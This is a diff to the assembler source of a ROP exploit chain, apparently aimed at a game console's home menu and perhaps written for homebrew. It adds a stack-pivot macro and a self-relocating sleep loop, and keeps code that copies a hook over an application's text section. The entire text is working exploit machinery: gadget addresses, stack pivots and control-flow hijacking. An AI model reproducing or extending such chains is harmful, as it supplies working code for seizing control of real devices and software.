@@ -21,6 +21,8 @@ APP_START_LINEAR equ 0xBABE0002
 
 GPU_REG_BASE equ 0x1EB00000
 
+WAITLOOP_DST equ (MENU_LOADEDROP_BUFADR - (waitLoop_end - waitLoop_start))
+
 DUMMY_PTR equ (MENU_OBJECT_LOC - 4)
 
 .macro set_lr,_lr
@@ -74,7 +76,7 @@ DUMMY_PTR equ (MENU_OBJECT_LOC - 4)
 	set_lr MENU_NOP
 	.word ROP_MENU_POP_R0PC ; pop {r0, pc}
 		.word dst ; r0 (out ptr)
-	memcpy_r0_lr
+	memcpy_r0_lr src, size
 .endmacro
 
 .macro apt_open_session,skip
@@ -170,6 +172,16 @@ DUMMY_PTR equ (MENU_OBJECT_LOC - 4)
 	.word ROP_MENU_POP_R4R5PC
 	@@pivot_data:
 		.word MENU_OBJECT_LOC + @@loop_start ; sp
+		.word MENU_NOP ; pc
+.endmacro
+
+.macro jump_sp,dst
+	.word ROP_MENU_POP_R4PC
+		.word MENU_OBJECT_LOC + @@pivot_data + 4 ; r4 (pivot data location)
+	.word ROP_MENU_STACK_PIVOT
+	.word ROP_MENU_POP_R4R5PC
+	@@pivot_data:
+		.word dst ; sp
 		.word MENU_NOP ; pc
 .endmacro
 
@@ -301,13 +313,19 @@ DUMMY_PTR equ (MENU_OBJECT_LOC - 4)
 			apt_send_parameter 0x101, MENU_LOADEDROP_BUFADR + irrstString, 0x8, MENU_IRRST_HANDLE
 			apt_close_session 0
 
-		; sleep for ever and ever
+		; memcpy wait loop to destination
+			memcpy WAITLOOP_DST, (MENU_OBJECT_LOC+waitLoop_start-object), (waitLoop_end-waitLoop_start)
+
+		; jump to wait loop
+			jump_sp WAITLOOP_DST
+
+		; sleep for ever and ever (just in case)
 			sleep 0xffffffff, 0x0fffffff
 
-		; infinite loop just in case
+		; infinite loop (just in case)
 			infloop
 
-		; crash
+		; crash (just in case)
 			.word 0xDEADBABE
 
 	; copy hook code over app .text
@@ -346,6 +364,20 @@ DUMMY_PTR equ (MENU_OBJECT_LOC - 4)
 		.ascii "ir:rst"
 		.byte 0x00
 		.byte 0x00
+
+	.align 0x4
+	waitLoop_start:
+		.word ROP_MENU_POP_R4R5PC
+		waitLoop_pivot_data:
+			.word WAITLOOP_DST + waitLoop - waitLoop_start ; sp
+			.word MENU_NOP ; pc
+		waitLoop:
+			sleep 500*1000*1000, 0x00000000
+			.word ROP_MENU_POP_R4PC ; pop {r4, pc}
+				.word WAITLOOP_DST + waitLoop_pivot_data - waitLoop_start + 4 ; r4
+			.word ROP_MENU_STACK_PIVOT
+	waitLoop_end:
+
 
 	.align 0x20
 	appHook:
